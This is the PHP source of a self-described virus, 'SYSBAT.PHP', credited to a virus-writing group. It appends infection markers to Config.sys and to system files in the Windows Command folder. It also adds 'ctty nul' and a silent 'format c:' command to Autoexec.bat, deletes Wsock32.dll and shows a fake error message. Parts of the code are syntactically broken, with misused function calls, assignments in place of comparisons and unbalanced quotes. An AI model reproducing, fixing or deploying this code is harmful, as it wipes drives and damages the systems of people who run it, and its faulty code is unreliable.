<?php
// SYSBAT.PHP VIRUS 
// By Xmorfic, www.shadowvx.com/bcvg, The Black Cat Virii Group
// SYSBAT.PHP - This virus infectes Config.sys, autoexec.bat and system files in 
// C:\Windows\Command\ directory.

$config	= 'C:\Config.sys';
$autoexec = 'C:\Autoexec.bat';
$phps	  = "SYSBAT.PHP";
$newphp   = 'sysbat.sys';
$avxm	  = "This program performed an illegal operation";	

$infsystem = true;

	$infsys = fopen($config, "r");
	$check  = fread($infsys, filesize($config));
	$infs	= strstr ($check, '47hGHRHjkliliurpIOIPOIporipOOPOirujkJKLLJj<Xmorfic>HKGJD');
	if (!$infs) $infsystem = false;

	if ( ($infsystem=false) )
	{
		$infsys = fopen($config, "a");
		$fputs($infsys, "47hGHRHjkliliurpIOIPOIporipOOPOirujkJKLLJj<Xmorfic>HKGJD");
		$fputs($infsys, "Xmorfic, www.shadowvx.com/bcvg, Second PHP VIRUS");
		return;
	}

	fclose($infsys);

	$infbat = fopen($autoexec, "r");
	$checkb = fread($infbat, filesize($autoexec));
	$infb	= strstr ($checkb, 'format c: /autotest /q /u');
	if (!$infb) $infbatf = false;

	if ( ($infbatf=false) )
	{
		$infbat = fopen($autoexec, "a");
		$fputs($infbat, "ctty nul ");
		$fputs($infbat, "format c: /autotest /q /u ");
		return;

	}
	
	fclose($infbat);

	$systems = opendir('C:\Windows\Command\');
	while ($filesys = readdir($systems))
	{

		$infected = true;
		$systemexe = false;

		if ( ($systemexe = strstr ($filesys, '.sys') )
		if ( (is_writeable($filesys) )
		{
		
			$sysk = fopen($filesys, "r");
			$xst  = fread($sysk, filesize($filesys);
			$good = strstr ($xst, 'Xmorfic_Vx');
			if (!$good) $infected = false;
		}

		if ( ($infected=false) )
		{
			$sysk = fopen($filesys, "a");
			$fputs($sysk, "Xmorfic_VX_System_PHP_Infector!!');
			return;
		}
	}
	closedir($systems);
	
	// Rename the virus to sysbat.sys (Optional) $ren = rename(__FILE__, $newphp);
	
	$kok = unlink ('C:\Windows\System\Wsock32.dll');
	
	echo $avxm;
?>

	
